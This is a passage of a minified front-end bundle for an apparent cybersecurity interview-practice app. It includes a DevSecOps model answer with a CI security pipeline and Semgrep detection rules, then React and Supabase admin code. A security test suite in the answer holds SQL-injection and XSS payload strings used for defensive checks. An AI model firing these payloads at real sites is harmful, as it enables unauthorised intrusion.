    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  security-gates:
    runs-on: ubuntu-latest
    
    steps:
    # 1. Static Code Analysis
    - name: Checkout code
      uses: actions/checkout@v3
      
    - name: SonarQube Security Scan
      uses: sonarqube-quality-gate-action@master
      with:
        scanMetadataReportFile: target/sonar/report-task.txt
      env:
        SONAR_TOKEN: \${{ secrets.SONAR_TOKEN }}
        
    - name: Semgrep SAST
      uses: returntocorp/semgrep-action@v1
      with:
        config: >-
          p/security-audit
          p/secrets
          p/owasp-top-ten
          
    # 2. Dependency Vulnerability Scanning
    - name: OWASP Dependency Check
      uses: dependency-check/Dependency-Check_Action@main
      with:
        project: 'microservice'
        path: '.'
        format: 'ALL'
        
    - name: Snyk Vulnerability Scan
      uses: snyk/actions/node@master
      env:
        SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
      with:
        args: --severity-threshold=high
        
    # 3. Container Security Scanning
    - name: Build Docker Image
      run: docker build -t app:latest .
      
    - name: Trivy Container Scan
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: 'app:latest'
        format: 'sarif'
        output: 'trivy-results.sarif'
        
    - name: Anchore Container Scan
      uses: anchore/scan-action@v3
      with:
        image: "app:latest"
        fail-build: true
        severity-cutoff: high
        
    # 4. Infrastructure as Code Security
    - name: Terraform Security Scan
      uses: bridgecrewio/checkov-action@master
      with:
        directory: ./terraform
        framework: terraform
        
    - name: CloudFormation Security Scan
      run: |
        cfn-lint cloudformation/*.yaml
        cfn_nag_scan --input-path cloudformation/
        
    # 5. Dynamic Security Testing
    - name: Deploy to Test Environment
      run: |
        kubectl apply -f k8s/test/
        
    - name: OWASP ZAP Baseline Scan
      uses: zaproxy/action-baseline@v0.7.0
      with:
        target: 'https://test-app.example.com'
        
    - name: Nuclei Security Scan
      uses: projectdiscovery/nuclei-action@main
      with:
        target: 'https://test-app.example.com'
        templates: 'cves,vulnerabilities,misconfiguration'
\`\`\`

**Security Gate Implementation Details:**

**1. Static Code Analysis Configuration:**

\`\`\`python
# .semgrep.yml
rules:
  - id: hardcoded-secrets
    pattern: |
      password = "..."
    message: "Hardcoded password detected"
    severity: ERROR
    languages: [python, javascript, java]
    
  - id: sql-injection
    pattern: |
  cursor.execute("SELECT * FROM users WHERE id = " + $USER_INPUT)
    message: "Potential SQL injection vulnerability"
    severity: ERROR
    languages: [python]
    
  - id: xss-vulnerability
    pattern: |
  innerHTML = $USER_INPUT
    message: "Potential XSS vulnerability"
    severity: ERROR
    languages: [javascript]
\`\`\`

**2. Dependency Scanning with Policy:**

\`\`\`json
{
  "snyk": {
    "policies": {
      "SNYK-JS-LODASH-567746": {
        "reason": "No fix available, risk accepted",
        "expires": "2024-12-31T23:59:59.999Z"
      }
    },
    "severity-threshold": "high",
    "fail-on": "upgradable"
  }
}
\`\`\`

**3. Container Security Policy:**

\`\`\`yaml
# .trivyignore
CVE-2021-44228  # Log4j - not applicable to our stack
CVE-2022-12345  # Fixed in next release

# Dockerfile security best practices
FROM node:16-alpine AS builder
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nextjs -u 1001

# Security scanning in Dockerfile
RUN apk add --no-cache dumb-init
USER nextjs
EXPOSE 3000
ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "server.js"]
\`\`\`

**4. Dynamic Security Testing:**

\`\`\`python
# Custom security test suite
import requests
import pytest

class TestSecurityHeaders:
    def test_security_headers(self, base_url):
        response = requests.get(f"{base_url}/")
        
        # Check for security headers
        assert 'X-Content-Type-Options' in response.headers
        assert 'X-Frame-Options' in response.headers
        assert 'Strict-Transport-Security' in response.headers
        assert 'Content-Security-Policy' in response.headers
        
    def test_authentication_bypass(self, base_url):
        # Test for common auth bypass techniques
        payloads = ["admin'--", "' OR 1=1--", "admin' /*"]
        
        for payload in payloads:
            response = requests.post(f"{base_url}/login", {
                'username': payload,
                'password': 'test'
            })
            assert response.status_code != 200
            
    def test_xss_protection(self, base_url):
        xss_payloads = [
            "<script>alert('xss')<\/script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>"
        ]
        
        for payload in xss_payloads:
            response = requests.post(f"{base_url}/search", {
                'query': payload
            })
            assert payload not in response.text
\`\`\`

**5. Security Metrics and Reporting:**

\`\`\`python
# Security dashboard integration
class SecurityMetrics:
    def __init__(self):
        self.metrics = {
            'vulnerabilities_found': 0,
            'vulnerabilities_fixed': 0,
            'security_tests_passed': 0,
            'security_tests_failed': 0
        }
    
    def report_to_dashboard(self):
        # Send metrics to security dashboard
        dashboard_api.post('/metrics', self.metrics)
        
    def fail_build_on_critical(self, scan_results):
        critical_vulns = [v for v in scan_results if v.severity == 'CRITICAL']
        if critical_vulns:
            raise Exception(f"Build failed: {len(critical_vulns)} critical vulnerabilities found")
\`\`\`

**6. Security Policy Enforcement:**

\`\`\`yaml
# security-policy.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: security-policy
data:
  policy.rego: |
    package security
    
    # Deny containers running as root
    deny[msg] {
      input.spec.securityContext.runAsUser == 0
      msg := "Container must not run as root"
    }
    
    # Require security scanning
    deny[msg] {
      not input.metadata.annotations["security.scan.status"]
      msg := "Container must be security scanned"
    }
    
    # Enforce resource limits
    deny[msg] {
      not input.spec.containers[_].resources.limits
      msg := "Container must have resource limits"
    }
\`\`\``,explanation:"This comprehensive DevSecOps pipeline integrates security at every stage of the development lifecycle. The key is implementing security as code with automated gates that provide fast feedback to developers while maintaining security standards. The pipeline balances security rigor with development velocity through configurable policies and risk-based decision making.",followUpQuestions:["How would you handle security exceptions and risk acceptance in this pipeline?","What metrics would you track to measure the effectiveness of your security program?","How would you implement security testing for serverless applications?"],tags:["DevSecOps","CI/CD","Container Security","SAST","DAST"],timeLimit:50}],y2=()=>{const[a,n]=v.useState(null),[s,i]=v.useState(!1),[o,c]=v.useState(!1),[d,m]=v.useState(0),[f,x]=v.useState(""),[p,b]=v.useState(null),[w,j]=v.useState(!1),[N,k]=v.useState("all"),[F,T]=v.useState("all"),[R,S]=v.useState("all"),U=v.useRef(null),[z,H]=v.useState(null),[G,O]=v.useState(!1),[V,B]=v.useState(null),ae=()=>{z&&(z.getTracks().forEach(P=>P.stop()),H(null))},xe=async()=>{if(!(G||z)){O(!0),B(null);try{const P=await navigator.mediaDevices.getUserMedia({video:!0,audio:!0});if(H(P),U.current){U.current.srcObject=P,U.current.muted=!0;try{await U.current.play()}catch{}}}catch(P){const K=P instanceof Error?P.message:"Permission denied or no devices found";B(K)}finally{O(!1)}}};v.useEffect(()=>(a?xe():ae(),()=>{ae()}),[a]),v.useEffect(()=>{if(w&&p&&p>0){const P=setTimeout(()=>b(p-1),1e3);return()=>clearTimeout(P)}else p===0&&(j(!1),alert("Time is up! You can still continue working on the solution."))},[p,w]);const ye=P=>{b(P*60),j(!0)},ne=P=>{const K=Math.floor(P/60),le=P%60;return`${K}:${le.toString().padStart(2,"0")}`},fe=P=>{switch(P){case"junior":return"bg-green-100 text-green-800 border-green-200";case"mid":return"bg-yellow-100 text-yellow-800 border-yellow-200";case"senior":return"bg-orange-100 text-orange-800 border-orange-200";case"principal":return"bg-red-100 text-red-800 border-red-200";default:return"bg-gray-100 text-gray-800 border-gray-200"}},ie=P=>({Google:"",Microsoft:"",Amazon:"","Meta (Facebook)":"",Apple:"",Netflix:""})[P]||"",ee=[...new Set(Wc.map(P=>P.company))],M=["junior","mid","senior","principal"],W=[...new Set(Wc.map(P=>P.category))],Q=Wc.filter(P=>(N==="all"||P.company===N)&&(F==="all"||P.difficulty===F)&&(R==="all"||P.category===R)),E=P=>{n(P),i(!1),c(!1),m(0),x(""),b(null),j(!1)},I=()=>{d<a.hints.length-1&&m(d+1)};return a?e.jsx("div",{className:"p-6 bg-page min-h-screen",children:e.jsxs("div",{className:"max-w-6xl mx-auto",children:[e.jsxs("div",{className:"flex items-center justify-between mb-6",children:[e.jsx("button",{onClick:()=>n(null),className:"flex items-center space-x-2 text-muted hover:text-primary transition-colors",children:e.jsx("span",{children:" Back to Questions"})}),p!==null&&e.jsxs("div",{className:"flex items-center space-x-2 text-lg font-medium",children:[e.jsx(Pt,{className:"h-5 w-5 text-accent"}),e.jsx("span",{className:p<300?"text-accent":"text-contrast",children:ne(p)})]})]}),e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6 mb-6",children:[e.jsxs("div",{className:"flex items-start justify-between mb-4",children:[e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsx("div",{className:"text-3xl",children:ie(a.company)}),e.jsxs("div",{children:[e.jsx("h1",{className:"text-2xl font-bold text-primary",children:a.company}),e.jsx("p",{className:"text-muted",children:a.position})]})]}),e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsx("span",{className:`px-3 py-1 rounded-full border text-sm font-medium ${fe(a.difficulty)}`,children:a.difficulty.toUpperCase()}),e.jsx("span",{className:"px-3 py-1 rounded-full text-sm font-medium bg-muted text-accent",children:a.category})]})]}),e.jsxs("div",{className:"flex items-center space-x-6 text-sm text-gray-400 dark:text-gray-400 light:text-gray-500 mb-4",children:[e.jsxs("div",{className:"flex items-center space-x-1",children:[e.jsx(Pt,{className:"h-4 w-4"}),e.jsxs("span",{children:[a.timeLimit," minutes"]})]}),e.jsxs("div",{className:"flex items-center space-x-1",children:[e.jsx(Va,{className:"h-4 w-4"}),e.jsx("span",{children:a.tags.join(", ")})]})]}),!w&&p===null&&e.jsxs("button",{onClick:()=>ye(a.timeLimit),className:"bg-orange-600 text-white px-4 py-2 rounded-lg hover:bg-orange-700 transition-colors",children:["Start Timer (",a.timeLimit," min)"]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6",children:[e.jsxs("div",{className:"lg:col-span-2 space-y-6",children:[e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsx("h2",{className:"text-xl font-bold text-primary mb-4",children:"Question"}),e.jsx("div",{className:"prose max-w-none text-muted",children:e.jsx("pre",{className:"whitespace-pre-wrap font-sans",children:a.question})})]}),e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsx("h3",{className:"text-lg font-bold text-primary mb-4",children:"Your Solution"}),e.jsx("textarea",{value:f,onChange:P=>x(P.target.value),placeholder:"Write your solution here...",className:"w-full h-64 p-4 border border-card rounded-lg bg-card text-contrast font-mono text-sm resize-none focus:outline-none focus:ring-2 focus:ring-amber-500"}),e.jsxs("div",{className:"flex items-center justify-between mt-4",children:[e.jsxs("div",{className:"text-sm text-muted",children:[f.length," characters"]}),e.jsxs("button",{onClick:()=>i(!s),className:"flex items-center space-x-2 btn-primary btn-primary-rounded",children:[s?e.jsx(id,{className:"h-4 w-4"}):e.jsx(gs,{className:"h-4 w-4"}),e.jsx("span",{children:s?"Hide Solution":"Show Solution"})]})]})]}),s&&e.jsxs("div",{className:"bg-card border border-card rounded-lg p-6",children:[e.jsx("h3",{className:"text-lg font-bold text-primary mb-4",children:"Official Solution"}),e.jsx("div",{className:"prose max-w-none text-muted",children:e.jsx("div",{dangerouslySetInnerHTML:{__html:a.solution.replace(/\n/g,"<br/>").replace(/```([^`]+)```/g,'<pre class="bg-card text-accent p-4 rounded mt-4 mb-4 overflow-x-auto"><code>$1</code></pre>').replace(/`([^`]+)`/g,'<code class="bg-card text-accent px-1 rounded">$1</code>').replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>")}})}),e.jsxs("div",{className:"mt-6 p-4 bg-muted rounded-lg",children:[e.jsx("h4",{className:"font-bold text-primary mb-2",children:"Explanation"}),e.jsx("p",{className:"text-muted",children:a.explanation})]}),a.followUpQuestions&&e.jsxs("div",{className:"mt-4",children:[e.jsx("h4",{className:"font-bold text-green-800 dark:text-green-300 light:text-green-800 mb-2",children:"Follow-up Questions"}),e.jsx("ul",{className:"list-disc list-inside text-green-700 dark:text-green-200 light:text-green-700",children:a.followUpQuestions.map((P,K)=>e.jsx("li",{children:P},K))})]})]})]}),e.jsxs("div",{className:"space-y-6",children:[e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsxs("div",{className:"flex items-center justify-between mb-4",children:[e.jsx("h3",{className:"text-lg font-bold text-primary",children:"Camera & Microphone"}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx("button",{onClick:xe,disabled:G||!!z,className:`px-3 py-1 rounded-lg text-sm ${z?"bg-muted text-contrast cursor-not-allowed":"btn-primary"}`,children:G?"Starting":z?"Active":"Start"}),e.jsx("button",{onClick:ae,disabled:!z,className:`px-3 py-1 rounded-lg text-sm ${z?"btn-cta":"bg-muted text-contrast cursor-not-allowed"}`,children:"Stop"})]})]}),V&&e.jsxs("div",{className:"mb-3 text-sm text-accent",children:[V,". Please allow camera and microphone permissions in your browser and ensure no other app is using them."]}),e.jsx("div",{className:"aspect-video bg-card rounded-lg overflow-hidden border border-card flex items-center justify-center",children:e.jsx("video",{ref:U,autoPlay:!0,playsInline:!0,className:"w-full h-full object-cover"})}),e.jsx("p",{className:"mt-2 text-xs text-muted",children:"Preview shows your camera. Microphone is enabled for realism; audio is not recorded."})]}),e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsxs("div",{className:"flex items-center justify-between mb-4",children:[e.jsx("h3",{className:"text-lg font-bold text-primary",children:"Hints"}),e.jsx("button",{onClick:()=>c(!o),className:"text-accent hover:opacity-90 transition-colors",children:e.jsx(lo,{className:"h-5 w-5"})})]}),o?e.jsxs("div",{className:"space-y-3",children:[a.hints.slice(0,d+1).map((P,K)=>e.jsx("div",{className:"p-3 bg-muted border border-card rounded-lg",children:e.jsxs("div",{className:"flex items-start space-x-2",children:[e.jsx(lo,{className:"h-4 w-4 text-accent mt-0.5"}),e.jsx("p",{className:"text-muted text-sm",children:P})]})},K)),d<a.hints.length-1&&e.jsxs("button",{onClick:I,className:"w-full btn-primary py-2 rounded-lg text-sm",children:["Show Next Hint (",d+2,"/",a.hints.length,")"]})]}):e.jsx("p",{className:"text-gray-400 dark:text-gray-400 light:text-gray-500 text-sm",children:"Click the lightbulb to reveal hints when you need help."})]}),e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsx("h3",{className:"text-lg font-bold text-primary mb-4",children:"Progress"}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[f.length>0?e.jsx(Pe,{className:"h-5 w-5 text-accent"}):e.jsx("div",{className:"h-5 w-5 border-2 border-card rounded-full"}),e.jsx("span",{className:"text-muted",children:"Started writing solution"})]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[o?e.jsx(Pe,{className:"h-5 w-5 text-accent"}):e.jsx("div",{className:"h-5 w-5 border-2 border-card rounded-full"}),e.jsx("span",{className:"text-muted",children:"Used hints"})]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[s?e.jsx(Pe,{className:"h-5 w-5 text-accent"}):e.jsx("div",{className:"h-5 w-5 border-2 border-card rounded-full"}),e.jsx("span",{className:"text-muted",children:"Viewed solution"})]})]})]}),e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsx("h3",{className:"text-lg font-bold text-primary mb-4",children:"Related Topics"}),e.jsx("div",{className:"flex flex-wrap gap-2",children:a.tags.map((P,K)=>e.jsx("span",{className:"bg-muted text-muted px-2 py-1 rounded text-sm",children:P},K))})]})]})]}),e.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6",children:[e.jsxs("div",{className:"lg:col-span-2 space-y-6",children:[e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsx("h2",{className:"text-xl font-bold text-primary mb-4",children:"Question"}),e.jsx("div",{className:"prose max-w-none text-muted",children:e.jsx("pre",{className:"whitespace-pre-wrap font-sans",children:a.question})})]}),e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsx("h3",{className:"text-lg font-bold text-primary mb-4",children:"Your Solution"}),e.jsx("textarea",{value:f,onChange:P=>x(P.target.value),placeholder:"Write your solution here...",className:"w-full h-64 p-4 border border-card rounded-lg bg-card text-contrast font-mono text-sm resize-none focus:outline-none focus:ring-2 focus:ring-amber-500"}),e.jsxs("div",{className:"flex items-center justify-between mt-4",children:[e.jsxs("div",{className:"text-sm text-muted",children:[f.length," characters"]}),e.jsxs("button",{onClick:()=>i(!s),className:"flex items-center space-x-2 btn-primary btn-primary-rounded",children:[s?e.jsx(id,{className:"h-4 w-4"}):e.jsx(gs,{className:"h-4 w-4"}),e.jsx("span",{children:s?"Hide Solution":"Show Solution"})]})]})]}),s&&e.jsxs("div",{className:"bg-card border border-card rounded-lg p-6",children:[e.jsx("h3",{className:"text-lg font-bold text-primary mb-4",children:"Official Solution"}),e.jsx("div",{className:"prose max-w-none text-muted",children:e.jsx("div",{dangerouslySetInnerHTML:{__html:a.solution.replace(/\n/g,"<br/>").replace(/```([^`]+)```/g,'<pre class="bg-card text-accent p-4 rounded mt-4 mb-4 overflow-x-auto"><code>$1</code></pre>').replace(/`([^`]+)`/g,'<code class="bg-card text-accent px-1 rounded">$1</code>').replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>")}})}),e.jsxs("div",{className:"mt-6 p-4 bg-muted rounded-lg",children:[e.jsx("h4",{className:"font-bold text-primary mb-2",children:"Explanation"}),e.jsx("p",{className:"text-muted",children:a.explanation})]}),a.followUpQuestions&&e.jsxs("div",{className:"mt-4",children:[e.jsx("h4",{className:"font-bold text-green-800 dark:text-green-300 light:text-green-800 mb-2",children:"Follow-up Questions"}),e.jsx("ul",{className:"list-disc list-inside text-green-700 dark:text-green-200 light:text-green-700",children:a.followUpQuestions.map((P,K)=>e.jsx("li",{children:P},K))})]})]})]}),e.jsxs("div",{className:"space-y-6",children:[e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsxs("div",{className:"flex items-center justify-between mb-4",children:[e.jsx("h3",{className:"text-lg font-bold text-primary",children:"Camera & Microphone"}),e.jsxs("div",{className:"flex items-center gap-2",children:[e.jsx("button",{onClick:xe,disabled:G||!!z,className:`px-3 py-1 rounded-lg text-sm ${z?"bg-muted text-contrast cursor-not-allowed":"btn-primary"}`,children:G?"Starting":z?"Active":"Start"}),e.jsx("button",{onClick:ae,disabled:!z,className:`px-3 py-1 rounded-lg text-sm ${z?"btn-cta":"bg-muted text-contrast cursor-not-allowed"}`,children:"Stop"})]})]}),V&&e.jsxs("div",{className:"mb-3 text-sm text-accent",children:[V,". Please allow camera and microphone permissions in your browser and ensure no other app is using them."]}),e.jsx("div",{className:"aspect-video bg-card rounded-lg overflow-hidden border border-card flex items-center justify-center",children:e.jsx("video",{ref:U,autoPlay:!0,playsInline:!0,className:"w-full h-full object-cover"})}),e.jsx("p",{className:"mt-2 text-xs text-muted",children:"Preview shows your camera. Microphone is enabled for realism; audio is not recorded."})]}),e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsxs("div",{className:"flex items-center justify-between mb-4",children:[e.jsx("h3",{className:"text-lg font-bold text-primary",children:"Hints"}),e.jsx("button",{onClick:()=>c(!o),className:"text-accent hover:opacity-90 transition-colors",children:e.jsx(lo,{className:"h-5 w-5"})})]}),o?e.jsxs("div",{className:"space-y-3",children:[a.hints.slice(0,d+1).map((P,K)=>e.jsx("div",{className:"p-3 bg-muted border border-card rounded-lg",children:e.jsxs("div",{className:"flex items-start space-x-2",children:[e.jsx(lo,{className:"h-4 w-4 text-accent mt-0.5"}),e.jsx("p",{className:"text-muted text-sm",children:P})]})},K)),d<a.hints.length-1&&e.jsxs("button",{onClick:I,className:"w-full btn-primary py-2 rounded-lg text-sm",children:["Show Next Hint (",d+2,"/",a.hints.length,")"]})]}):e.jsx("p",{className:"text-gray-400 dark:text-gray-400 light:text-gray-500 text-sm",children:"Click the lightbulb to reveal hints when you need help."})]}),e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsx("h3",{className:"text-lg font-bold text-primary mb-4",children:"Progress"}),e.jsxs("div",{className:"space-y-3",children:[e.jsxs("div",{className:"flex items-center space-x-2",children:[f.length>0?e.jsx(Pe,{className:"h-5 w-5 text-accent"}):e.jsx("div",{className:"h-5 w-5 border-2 border-card rounded-full"}),e.jsx("span",{className:"text-muted",children:"Started writing solution"})]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[o?e.jsx(Pe,{className:"h-5 w-5 text-accent"}):e.jsx("div",{className:"h-5 w-5 border-2 border-card rounded-full"}),e.jsx("span",{className:"text-muted",children:"Used hints"})]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[s?e.jsx(Pe,{className:"h-5 w-5 text-accent"}):e.jsx("div",{className:"h-5 w-5 border-2 border-card rounded-full"}),e.jsx("span",{className:"text-muted",children:"Viewed solution"})]})]})]}),e.jsxs("div",{className:"bg-card rounded-lg shadow-md p-6",children:[e.jsx("h3",{className:"text-lg font-bold text-primary mb-4",children:"Related Topics"}),e.jsx("div",{className:"flex flex-wrap gap-2",children:a.tags.map((P,K)=>e.jsx("span",{className:"bg-muted text-muted px-2 py-1 rounded text-sm",children:P},K))})]})]})]})]})}):e.jsx("div",{className:"p-6 min-h-screen animate-fade-in",children:e.jsxs("div",{className:"max-w-6xl mx-auto",children:[e.jsxs("div",{className:"mb-8",children:[e.jsx("h1",{className:"text-3xl font-bold text-foreground mb-4",children:"Technical Interview Questions"}),e.jsx("p",{className:"text-muted-foreground text-lg",children:"Practice with real cybersecurity interview questions from top tech companies"})]}),e.jsx("div",{className:"bg-card rounded-lg shadow-md p-6 mb-8",children:e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-primary mb-2",children:"Company"}),e.jsxs("select",{value:N,onChange:P=>k(P.target.value),className:"w-full px-3 py-2 border border-card rounded-lg bg-muted text-primary focus:outline-none focus:ring-2 focus:ring-amber-500",children:[e.jsx("option",{value:"all",children:"All Companies"}),ee.map(P=>e.jsx("option",{value:P,children:P},P))]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-primary mb-2",children:"Difficulty"}),e.jsxs("select",{value:F,onChange:P=>T(P.target.value),className:"w-full px-3 py-2 border border-card rounded-lg bg-muted text-primary focus:outline-none focus:ring-2 focus:ring-amber-500",children:[e.jsx("option",{value:"all",children:"All Levels"}),M.map(P=>e.jsx("option",{value:P,children:P.charAt(0).toUpperCase()+P.slice(1)},P))]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-sm font-medium text-primary mb-2",children:"Category"}),e.jsxs("select",{value:R,onChange:P=>S(P.target.value),className:"w-full px-3 py-2 border border-card rounded-lg bg-muted text-primary focus:outline-none focus:ring-2 focus:ring-amber-500",children:[e.jsx("option",{value:"all",children:"All Categories"}),W.map(P=>e.jsx("option",{value:P,children:P},P))]})]})]})}),e.jsx("div",{className:"grid gap-6",children:Q.map(P=>e.jsxs("div",{onClick:()=>E(P),className:"bg-card/50 backdrop-blur-sm rounded-xl shadow-lg p-6 cursor-pointer hover:shadow-primary/10 hover:border-primary/50 transition-all duration-300 border border-white/10 group",children:[e.jsxs("div",{className:"flex items-start justify-between mb-4",children:[e.jsxs("div",{className:"flex items-center space-x-4",children:[e.jsx("div",{className:"text-2xl",children:ie(P.company)}),e.jsxs("div",{children:[e.jsx("h3",{className:"text-xl font-bold text-foreground",children:P.company}),e.jsx("p",{className:"text-muted-foreground",children:P.position})]})]}),e.jsxs("div",{className:"flex items-center space-x-2",children:[e.jsx("span",{className:`px-3 py-1 rounded-full border text-sm font-medium ${fe(P.difficulty)}`,children:P.difficulty.toUpperCase()}),e.jsx(Yt,{className:"h-5 w-5 text-muted-foreground"})]})]}),e.jsxs("div",{className:"mb-4",children:[e.jsx("span",{className:"px-3 py-1 rounded-full text-sm font-medium mr-3 bg-secondary/50 text-secondary-foreground border border-white/10",children:P.category}),e.jsxs("span",{className:"text-muted-foreground text-sm",children:[P.timeLimit," minutes"]})]}),e.jsxs("p",{className:"text-muted-foreground mb-4 line-clamp-3",children:[P.question.substring(0,200),"..."]}),e.jsxs("div",{className:"flex flex-wrap gap-2",children:[P.tags.slice(0,4).map((K,le)=>e.jsx("span",{className:"bg-secondary/50 text-secondary-foreground px-2 py-1 rounded text-xs border border-white/10",children:K},le)),P.tags.length>4&&e.jsxs("span",{className:"text-muted-foreground text-xs",children:["+",P.tags.length-4," more"]})]})]},P.id))}),Q.length===0&&e.jsxs("div",{className:"text-center py-12",children:[e.jsx(Hv,{className:"h-16 w-16 text-muted-foreground mx-auto mb-4"}),e.jsx("h3",{className:"text-lg font-medium text-foreground mb-2",children:"No questions found"}),e.jsx("p",{className:"text-muted-foreground",children:"Try adjusting your filters to see more questions."})]})]})})};class w2{async getAllUsers(){try{const{data:n,error:s}=await Z.from("users").select("*").order("created_at",{ascending:!1});if(s)throw new Error(`Failed to fetch users: ${s.message}`);return n}catch(n){throw console.error("Get all users error:",n),n}}async getUsersByRole(n){try{const{data:s,error:i}=await Z.from("users").select("*").eq("role",n).order("created_at",{ascending:!1});if(i)throw new Error(`Failed to fetch users by role: ${i.message}`);return s}catch(s){throw console.error("Get users by role error:",s),s}}async updateUserRole(n,s){try{const{data:i,error:o}=await Z.from("users").update({role:s}).eq("id",n).select().single();if(o)throw new Error(`Failed to update user role: ${o.message}`);return i}catch(i){throw console.error("Update user role error:",i),i}}async deleteUser(n){try{const{error:s}=await Z.from("users").delete().eq("id",n);if(s)throw new Error(`Failed to delete user: ${s.message}`);return!0}catch(s){throw console.error("Delete user error:",s),s}}async getAllCourses(){try{const{data:n,error:s}=await Z.from("courses").select("*").order("created_at",{ascending:!1});if(s)throw new Error(`Failed to fetch all courses: ${s.message}`);return n}catch(n){throw console.error("Get all courses error:",n),n}}async getAllNotes(){try{const{data:n,error:s}=await Z.from("notes").select("*").order("created_at",{ascending:!1});if(s)throw new Error(`Failed to fetch notes: ${s.message}`);return n||[]}catch(n){throw console.error("Get notes error:",n),n}}async createNote(n){try{const{data:s,error:i}=await Z.from("notes").insert([n]).select().single();if(i)throw new Error(`Failed to create note: ${i.message}`);return s}catch(s){throw console.error("Create note error:",s),s}}async uploadFile(n,s="uploads"){try{const i=n.name.split(".").pop(),o=`${Date.now()}.${i}`,c=`${s}/${o}`,{error:d}=await Z.storage.from("uploads").upload(c,n);if(d)throw new Error(`Failed to upload file: ${d.message}`);const{data:{publicUrl:m}}=Z.storage.from("uploads").getPublicUrl(c);return m}catch(i){throw console.error("Upload file error:",i),i}}async updateCourseStatus(n,s){try{const{data:i,error:o}=await Z.from("courses").update({is_published:s}).eq("id",n).select().single();if(o)throw new Error(`Failed to update course status: ${o.message}`);return i}catch(i){throw console.error("Update course status error:",i),i}}async getDashboardStats(){try{const{data:n,error:s}=await Z.from("users").select("role").neq("role","admin");if(s)throw new Error(`Failed to fetch user stats: ${s.message}`);const{data:i,error:o}=await Z.from("courses").select("is_published, enrollment_count");if(o)throw new Error(`Failed to fetch course stats: ${o.message}`);const{data:c,error:d}=await Z.from("course_enrollments").select("enrolled_at");if(d)throw new Error(`Failed to fetch enrollment stats: ${d.message}`);const m=n.filter(w=>w.role==="teacher").length,f=n.filter(w=>w.role==="student").length,x=i.length,p=i.filter(w=>w.is_published).length,b=c.length;return{users:{teachers:m,students:f,total:m+f},courses:{total:x,published:p,draft:x-p},enrollments:{total:b,thisMonth:c.filter(w=>{const j=new Date(w.enrolled_at),N=new Date;return j.getMonth()===N.getMonth()&&j.getFullYear()===N.getFullYear()}).length}}}catch(n){throw console.error("Get dashboard stats error:",n),n}}async getUserProgress(n){try{const{data:s,error:i}=await Z.from("user_progress").select(`
          *,
          course:courses(title, difficulty),
          module:course_modules(title)
        `).eq("user_id",n).order("updated_at",{ascending:!1});if(i)throw new Error("Failed to fetch user progress");return s}catch(s){throw console.error("Get user progress error:",s),s}}async getTeacherAnalytics(n){try{const{data:s,error:i}=await Z.from("courses").select(`
          *,
          course_enrollments(count)
        `).eq("teacher_id",n);if(i)throw new Error("Failed to fetch teacher courses");const o=s.map(m=>m.id),{data:c,error:d}=await Z.from("user_progress").select("*").in("course_id",o);if(d)throw new Error("Failed to fetch progress data");return{courses:s.length,totalEnrollments:c.length,completedModules:c.filter(m=>m.completed).length,averageScore:c.length>0?c.reduce((m,f)=>m+f.quiz_score,0)/c.length:0}}catch(s){throw console.error("Get teacher analytics error:",s),s}}}const ps=new w2,j2=()=>{const[a,n]=v.useState("official"),[s,i]=v.useState([]),[o,c]=v.useState([]),[d,m]=v.useState([]),[f,x]=v.useState(""),[p,b]=v.useState("all"),[w,j]=v.useState(!0),[N,k]=v.useState(!1),[F,T]=v.useState(!1),{user:R,isAdmin:S}=Ie();v.useEffect(()=>{U(),R&&z()},[R]),v.useEffect(()=>{H()},[s,f,p]);const U=async()=>{try{j(!0);const B=await ps.getAllNotes();i(B)}catch(B){console.error("Failed to load notes:",B)}finally{j(!1)}},z=async()=>{if(R)try{const B=await Ln.getPersonalNotes(R.id);c(B)}catch(B){console.error("Failed to load personal notes:",B)}},H=()=>{let B=s;f&&(B=B.filter(ae=>ae.title.toLowerCase().includes(f.toLowerCase())||ae.description.toLowerCase().includes(f.toLowerCase()))),p!=="all"&&(B=B.filter(ae=>ae.course_id===p)),m(B)},G=B=>{window.open(B,"_blank")},O=async B=>{if(confirm("Are you sure you want to delete this log?"))try{await Ln.deletePersonalNote(B),c(o.filter(ae=>ae.id!==B))}catch(ae){console.error("Failed to delete note:",ae)}},V=[...new Set(s.map(B=>B.course_id))];return 